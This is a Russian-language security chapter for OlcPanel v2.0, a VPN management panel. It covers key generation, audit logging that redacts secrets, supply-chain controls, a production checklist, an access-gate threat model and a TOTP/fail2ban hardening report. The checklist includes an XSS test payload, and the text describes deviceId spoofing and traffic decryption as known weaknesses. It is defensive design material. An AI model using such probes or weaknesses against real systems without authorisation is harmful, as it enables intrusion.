### 8.9.1 Что даёт модель общий-ключ + `deviceId` (и чего НЕ даёт)

```
Реальность v2.0:
  - Ключ XChaCha20 и Jitsi-комната ОБЩИЕ для всех клиентов сервера (из server.yaml).
  - Различие и контроль доступа — по deviceId (x-hwid) в authz.json + Gate.

Что ДАЁТ:
  1. Точечная блокировка: убрать deviceId из allow → отвалится ОДИН клиент,
     остальные не затронуты (монетизация работает несмотря на общий ключ).
  2. Стабильность соединения: клиент всегда в «живой» серверной комнате
     (устранена причина «нет пинга» из модели «комната на клиента»).
  3. Применение к живым сессиям: Gate рвёт сессию заблокированного deviceId
     в пределах enforce_interval, а не только на reconnect.

Чего НЕ даёт (осознанные компромиссы — фиксируем честно):
  - НЕТ крипто-изоляции между клиентами: владелец общего ключа технически
    может расшифровать трафик в общей комнате. Это приемлемо для модели
    «доверенный провайдер для знакомых», но НЕ для anti-провайдерской угрозы.
    → Phase 2 (крипто-токены/подписанные device-claims) — задел на будущее.
  - deviceId, присылаемый клиентом (x-hwid), на Phase 1 НЕ криптографически
    доказан (десктоп шлёт случайный uuid). Подмена deviceId возможна →
    усиление в Phase 2 (подписанные токены в claims, релиз olcbox).
  - При полном взломе VPS атакующий получает общий ключ И authz.json.
    Митигация: ограничение прав файла, бэкап, короткие сроки подписок.
```

### 8.9.2 Генерация изолированных ключей — 🟠 LEGACY (в v2.0 НЕ вызывается)

> ⚠️ LEGACY: пер-клиентский ключ не генерируется (Решение 1). Блок ниже — историко-референс; в v2.0 ключ берётся общий из `server.yaml`.

```python
# app/core/crypto.py

import secrets
import uuid

def generate_crypto_key() -> str:
    """
    Генерирует 256-bit ключ для OlcRTC шифрования.

    Используем secrets.token_hex(32):
      - secrets module — CSPRNG (Cryptographically Secure Pseudo-Random Number Generator)
      - На Linux: читает из /dev/urandom
      - 32 байта = 256 бит = 64 hex символа
      - Вероятность коллизии: 1 / 2^256 ≈ 1.16e-77 (практически невозможна)

    Почему НЕ random.token_hex:
      - random module использует Mersenne Twister (не криптобезопасный)
      - Предсказуем если знать seed или часть вывода
      - НИКОГДА не использовать для секретных ключей

    Почему НЕ uuid.uuid4():
      - uuid4 только 122 бита случайности (из 128, 6 бит фиксированы)
      - secrets.token_hex(32) = 256 бит — вдвое больше
    """
    return secrets.token_hex(32)  # 32 bytes = 64 hex chars


def generate_room_name(prefix: str = "olcrtc") -> str:
    """
    Генерирует уникальное имя Jitsi-комнаты.

    Формат: {prefix}-{8_hex_chars}
    Пример: olcrtc-a1b2c3d4

    8 hex символов = 4 байта = 32 бита → 4 миллиарда вариантов.
    При 20 активных клиентах вероятность коллизии пренебрежимо мала.
    При > 1000 клиентах стоит увеличить до 12 символов.
    """
    suffix = secrets.token_hex(4)   # 4 bytes = 8 hex chars
    return f"{prefix}-{suffix}"


def generate_jwt_id() -> str:
    """JTI (JWT ID) для revocation list."""
    return str(uuid.uuid4())
```

---

## 8.10 Аудит-лог — неизменяемость и полнота

### 8.10.1 Принцип аудита

```
Каждое мутирующее действие ДОЛЖНО быть залогировано в audit_log:

Обязательные события:
  auth.*          — все попытки входа (успешные и нет), logout
  client.*        — create, update, suspend, restore, delete
  config.*        — generate, revoke
  subscription.*  — create, extend, expire, suspend (auto и manual)
  payment.*       — create
  settings.*      — update jitsi_server, update other
  olcrtc.*        — restart, config_update
  rate_limit.*    — exceeded (для мониторинга атак)

НЕ логируем (GET запросы без изменений):
  - list_clients, get_client, get_config (кроме sensitive reads)
  - get_dashboard, get_traffic

Почему важно:
  1. Forensics при инциденте: "кто и когда отозвал конфиг Антона?"
  2. Compliance: история операций
  3. Обнаружение аномалий: 10 failed logins с разных IP за 5 минут
```

### 8.10.2 AuditService

```python
# app/services/audit_service.py

import json
from datetime import datetime
from sqlalchemy.orm import Session
from app.models.audit_log import AuditLog


class AuditService:
    """
    Централизованное логирование всех действий.

    Важные гарантии:
      1. Никогда не бросает исключения (ошибка аудита не должна ломать операцию)
      2. Логирует в БД (audit_log таблица)
      3. Дополнительно пишет в файл audit.log (append-only)
      4. details сериализуется в JSON (не хранятся пароли!)

    Что НЕ должно быть в details:
      - Пароли (даже хешированные)
      - crypto_key (полный ключ)
      - SECRET_KEY
      - Любые секреты
    """

    SENSITIVE_KEYS = {"password", "password_hash", "crypto_key", "secret_key", "token"}

    def log(
        self,
        db: Session,
        action: str,
        admin_id: int | None = None,
        entity_type: str | None = None,
        entity_id: int | None = None,
        details: dict | None = None,
        ip_address: str | None = None,
    ) -> None:
        """
        Записывает событие в audit_log.

        admin_id=None для системных событий (APScheduler, автоотключение).

        Не бросает исключений — при ошибке логирует в stderr и продолжает.
        """
        try:
            # Фильтруем чувствительные данные
            clean_details = self._sanitize_details(details) if details else None
            details_json = json.dumps(clean_details, ensure_ascii=False) if clean_details else None

            audit_entry = AuditLog(
                admin_id=admin_id,
                action=action,
                entity_type=entity_type,
                entity_id=entity_id,
                details=details_json,
                ip_address=ip_address,
                created_at=datetime.utcnow(),
            )
            db.add(audit_entry)
            db.flush()  # Записываем в БД (в рамках текущей транзакции)

            # Дополнительно — в файл
            self._write_to_file(action, admin_id, entity_type, entity_id, ip_address)

        except Exception as e:
            import logging
            logging.getLogger("audit").error(
                f"Audit log failed: {e} "
                f"(action={action}, admin_id={admin_id}, entity={entity_type}/{entity_id})"
            )
            # НЕ re-raise — аудит не должен прерывать операцию

    def _sanitize_details(self, details: dict) -> dict:
        """
        Удаляет чувствительные ключи из details перед логированием.
        """
        sanitized = {}
        for key, value in details.items():
            if key.lower() in self.SENSITIVE_KEYS:
                sanitized[key] = "[REDACTED]"
            elif isinstance(value, dict):
                sanitized[key] = self._sanitize_details(value)
            else:
                # Если это похоже на crypto key (64 hex символа) — маскируем
                if isinstance(value, str) and len(value) == 64 and self._looks_like_key(value):
                    sanitized[key] = value[:8] + "..." + value[-4:]
                else:
                    sanitized[key] = value
        return sanitized

    def _looks_like_key(self, value: str) -> bool:
        """Проверяет, похожа ли строка на hex-ключ."""
        try:
            int(value, 16)
            return True
        except ValueError:
            return False

    def _write_to_file(
        self,
        action: str,
        admin_id: int | None,
        entity_type: str | None,
        entity_id: int | None,
        ip_address: str | None,
    ) -> None:
        """Дополнительная запись в файловый audit.log."""
        import logging
        audit_logger = logging.getLogger("audit")
        audit_logger.info(
            f"action={action} admin_id={admin_id} "
            f"entity={entity_type}/{entity_id} ip={ip_address}"
        )
```

---

## 8.11 Зависимости и supply chain security

### 8.11.1 Зафиксированные версии зависимостей

```
Все зависимости в requirements.txt зафиксированы через == (не >= или ~=).

Причина:
  - >= позволяет автообновление → можно получить вредоносный пакет
  - == гарантирует воспроизводимую установку

После проверки создаём lock-файл:
  pip freeze > requirements.lock.txt
  (содержит все транзитивные зависимости тоже)

Обновление:
  pip install --upgrade package_name
  pip freeze > requirements.lock.txt
  # Тестируем
  # Коммитим оба файла
```

### 8.11.2 Периодическая проверка уязвимостей

```bash
# pip-audit — проверка известных CVE
pip install pip-audit
pip-audit -r requirements.txt

# safety — альтернатива
pip install safety
safety check -r requirements.txt

# Рекомендация: запускать перед каждым деплоем
# Включить в CI/CD при наличии
```

### 8.11.3 Chart.js CDN — SRI (Subresource Integrity)

```html
<!-- Загрузка Chart.js с проверкой целостности (SRI hash) -->
<script
  src="https://cdn.jsdelivr.net/npm/chart.js@4.4.2/dist/chart.umd.min.js"
  integrity="sha384-РЕАЛЬНЫЙ_HASH_ЗДЕСЬ"
  crossorigin="anonymous"
  defer>
</script>

<!-- Как получить SRI hash:
     curl -s https://cdn.jsdelivr.net/npm/chart.js@4.4.2/dist/chart.umd.min.js \
       | openssl dgst -sha384 -binary | openssl enc -base64 -A
     Результат вставить в integrity="sha384-..."

  Зачем:
    Если CDN взломан и подменён файл → браузер откажется выполнять его
    (hash не совпадёт с integrity атрибутом)
-->
```

---

## 8.12 Чеклист безопасности перед запуском в production

```
[ ] SECRET_KEY сгенерирован случайно (≥ 64 символа hex) и НЕ дефолтный
[ ] ADMIN_PASSWORD сложный (≥ 16 символов) и НЕ "changeme_please"
[ ] .env имеет права 600 (только olcpanel читает)
[ ] olcpanel.db имеет права 600
[ ] Nginx только на 443 + HTTP→HTTPS redirect настроен
[ ] Swagger UI (/api/docs) закрыт с внешних IP (только localhost)
[ ] fail2ban запущен и настроен для /api/auth/login
[ ] Все security headers присутствуют (проверить на securityheaders.com)
[ ] HSTS включён (Strict-Transport-Security)
[ ] SRI hash для Chart.js CDN заполнен реальным значением
[ ] rate limit работает (проверить: 6 неверных входов → 429)
[ ] httpOnly cookie установлена (проверить в DevTools → Application → Cookies)
[ ] XSS проверка: вставить <script>alert(1)</script> в поле "Имя клиента" → не должно сработать
[ ] Резервное копирование настроено и протестировано (restore)
[ ] journalctl -u olcpanel — нет ошибок при старте
[ ] ADMIN_PASSWORD удалён из .env (после первого входа через смену пароля в UI)
```

---

## 8.13 Безопасность `authz` / `Gate` (модель last-known-good)

> Центральный раздел безопасности v2.0. В модели «общий ключ + `deviceId`» именно `authz.json`/`Gate` — граница между «платит» и «не платит». Поэтому угрозы вокруг этого файла = угрозы выручке и доступу. Решение владельца (Решение 4 / 5.2) — **last-known-good** — здесь зафиксировано как контроль безопасности.

### 8.13.1 Базовая угроза: «потеря/порча `authz.json` → бесплатный доступ всем»

```
Угроза: при fail-open Gate отсутствие/порча authz.json (частичная запись,
        ошибка диска, неудачный push, баг writer'а) → Allowed()=true для ВСЕХ.
        Самый частый класс отказов → тихая бесплатная раздача VPN, включая
        неоплативших и заблокированных. Без сигнала на стороне клиента.

Контроль (ВЫБРАНО): Gate fail_mode = lkg (last-known-good).
  - При ошибке свежего чтения Gate держит ПОСЛЕДНИЙ валидный allowlist,
    не открывается всем и не закрывает всех.
  - lkgAllow обновляется ТОЛЬКО после успешной валидации схемы и version.
  - Инвариант (тест AZ-07): битый/пропавший файл в lkg НЕ расширяет allow.
  - Cold-start (нет валидного состояния в памяти при запуске): policy=closed +
    громкий alert («никогда не видели валидный allowlist» ≠ «потеряли свежий»).
```

### 8.13.2 Остаточный риск: «устаревший allowlist»

LKG смещает риск с «открыли всех» на «применяем старое». Заблокированный клиент может оставаться доступен до приезда следующего валидного файла.

```
Контроль:
  - lkg_max_age (напр. 24h): старше → critical-alert (+ опц. переход в closed).
  - health-poll: applied_version / lkg_valid_at / load_errors → дашборд + Telegram.
  - ручной re-push (POST /api/servers/{id}/repush-authz) при load_errors>0.
Остаточный риск ПРИНИМАЕТСЯ как меньшее зло против «бесплатно всем».
```

### 8.13.3 Целостность записи и доставки

```
Запись (панель):
  - Атомарно: tmp → fsync → os.rename (никаких дописываний на месте).
  - Монотонный version (authz_state) — против отката allowlist гонкой ретраев.
  - Права: каталог data/ и authz.json доступны только сервису (chmod 600 / владелец).

Доставка на флот (вариант B, Этап 3):
  - mTLS / подпись payload (защита от MITM/подмены allowlist в сети).
  - Сервер: version-reject (≤applied → 409), валидация схемы (битый → 400, LKG цел),
    200 ТОЛЬКО после успешной атомарной записи.
  - Битый/поддельный payload не доходит до файла → LKG даже не активируется.
```

### 8.13.4 SPOF центральной панели и автономность серверов

```
Угроза: на multi-server авторизация централизуется в панели → её деградация
        бьёт по всему флоту (особенно вариант C — онлайн-проверка).

Контроль:
  - Файловый контракт (A/B) специально оставляет серверы АВТОНОМНЫМИ:
    панель упала → Gate работает по последнему authz.json (+ LKG при порче).
  - Бэкап БД (источник пересборки authz) + authz.json/server.yaml (7.10.5).
  - Усиленный вход в панель поднимается в приоритете: fail2ban → 2FA(TOTP) +
    секретный URL-путь (на single-server — P1/P2, на флоте — ближе к P0).
```

### 8.13.5 Подмена `deviceId` (граница Phase 1)

```
Угроза: x-hwid присылается клиентом; на Phase 1 не доказан криптографически
        (десктоп шлёт случайный uuid) → теоретическая подмена/шеринг deviceId.
Контроль сейчас: лимит устройств на клиента (Этап 2); отвязка/ротация sub-токена.
Контроль будущий (Phase 2): подписанные device-claims в handshake (релиз olcbox) —
        Gate проверяет подпись, а не доверяет присланному hwid.
Примечание: это НЕ блокирует монетизацию (Android-olcbox шлёт стабильный hwid).
```

---

*Конец корпуса архитектуры OlcPanel v2.0. Аналитический вход и приоритезация: [[OlcPanel_Анализ_Marzban_3xui]] (разделы 4 «масштабирование», 5 «риски», 7 «приоритет»). Возврат к обзору: [[OlcPanel_00_Введение]].*

> Историческая нумерация v1.x предполагала отдельные `09_Примеры_кода` и `10_Дорожная_карта`. В v2.0 примеры кода размещены внутри разделов 03/05 рядом с контрактами, а дорожная карта — в разделах 7–8 аналитического документа.

---

## 8.3.3 Реализация Task9 (fail2ban + TOTP 2FA pyotp+qrcode в login + секретный путь + усиленный rate limit)

**Статус:** ✅ Реализовано (эволюционно, минимально, сухой режим по умолчанию, не ломает live клиентов/эндпоинты).

**Изменённые файлы (бэкапы pre в /root/olcrtc-backups/*task9-pre-*.bak):**
- config.py: PANEL_TOTP_SECRET, PANEL_SECRET_PREFIX, LOGIN_MAX_ATTEMPTS=5, LOGIN_WINDOW_SECONDS=900
- auth.py: in-memory rate (deque per IP), authenticate_admin(..., totp_code=None), verify_totp / generate / get_uri (lazy pyotp), set_totp_secret + reuse _persist_env_var; интеграция с bcrypt/JWT/fp без регрессий
- schemas.py: LoginRequest (username+pass+totp_code?), TOTPSetupResponse, TOTPConfirmRequest
- routers/meta.py: login переведён на body (Request + LoginRequest для IP + totp), rate check + 429+Retry-After, обновлены вызовы; + /api/auth/2fa/setup (QR data:image/png;base64 + otpauth + secret), /api/auth/2fa/confirm (verify + persist)
- main.py: SecretPathGuard middleware (BaseHTTPMiddleware) — если prefix и нет X-Panel-Prefix: 404 на /api и / (dry default prefix="")
- requirements.txt: pyotp==2.9.0 qrcode==8.0 pillow==10.4.0 (минимально)

**Секретный путь (nginx + app):**
nginx пример (в /etc/nginx/conf.d/olcpanel.conf, добавить в server {}):
```
# Секретный путь вместо прямого /
location /panel-SECRET/ {
    rewrite ^/panel-SECRET/(.*)$ /$1 break;
    proxy_set_header X-Panel-Prefix "true";
    proxy_set_header X-Real-IP $remote_addr;
    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    proxy_pass http://127.0.0.1:8000;
}
# Прямая доступность /api скрываем (404)
location /api/ { return 404; }
location = / { return 404; }
```
App middleware в main.py: читает PANEL_SECRET_PREFIX из env/config, требует заголовок от nginx — иначе 404. При rewrite app видит чистые /api , header пропускает. Default "" = без изменений (live-safe).

**fail2ban пример (для nginx access log 401 на login):**
/etc/fail2ban/jail.local (или jail.d/olcpanel.conf):
```
[olcpanel-auth]
enabled = true
filter = olcpanel-auth
logpath = /var/log/nginx/olcpanel-access.log
maxretry = 10
findtime = 600
bantime = 3600
action = iptables-allports[name=olcpanel]
```
/etc/fail2ban/filter.d/olcpanel-auth.conf:
```
[Definition]
failregex = ^<HOST> - .* "POST /api/auth/login .* 401
ignoreregex =
```
Затем `fail2ban-client reload`. Банит на уровне iptables (даже nginx не видит). Логи 401 от нашей rate/2fa/pass fail покрывают.

**Усиление rate limit:**
- Уровень 1: nginx limit_req (рекоменд 5/min burst)
- Уровень 2: in-app (auth._failed_attempts + is_rate_limited 5/900s) → 429
- Уровень 3: bcrypt
- Уровень 4: fail2ban
- + одинаковое время ответа, нет username enum.

**2FA flow:**
1. (опционально) После первого логина (или dedicated): POST /api/auth/2fa/setup (с JWT) → {secret, qr_code: "data:image/png;base64,...", otpauth_uri}
2. Сканируешь QR в Aegis/Google Authenticator.
3. POST /api/auth/2fa/confirm {code: "123456", secret?: "..."} → если verify ок → set_totp_secret (persist в panel.env + config) → 2FA on.
4. Login: POST /api/auth/login {username, password, totp_code: "123456"} . Если secret в config — код обязателен, иначе 401.

**Интеграция:** полностью в существующем auth (JWT + bcrypt support + fp + _persist + get_current_admin). Login теперь требует totp если включен. change_password и др. endpoints не тронуты (сессия уже с 2FA).

**Dry / тесты (симуляция, proof в run.log + /tmp/test_task9_security_dry.py):**
- Brute: 6 вызовов authenticate + record → is_rate_limited True после 5, 429 на 6-м.
- 2FA: generate secret, verify с правильным кодом (pyotp.time-based mock) → True; неправильный → False; setup/confirm roundtrip (без реального persist в dry).
- Secret path: middleware с prefix="/panel-SECRET", без header на /api/foo → 404; с header → pass.
- Без secret (default): login как раньше, 2FA не требует, guard не 404.
Все симуляции PASS (см. тест скрипт + run.log).

Guardrails соблюдены: pre-backups, dry default (всё выкл), эволюционно (не сломаны существующие JWT/эндпоинты/6 клиентов), минимальные deps, no live restart здесь (Hermes позже).

См. также [[OlcPanel_Анализ_Marzban_3xui.md]] §3.1 (донор 3x-ui) и backlog task9.

════════════════════════════════════════════════════════════════════════════════
<!-- Конец файла 08_Безопасность.md -->
════════════════════════════════════════════════════════════════════════════════

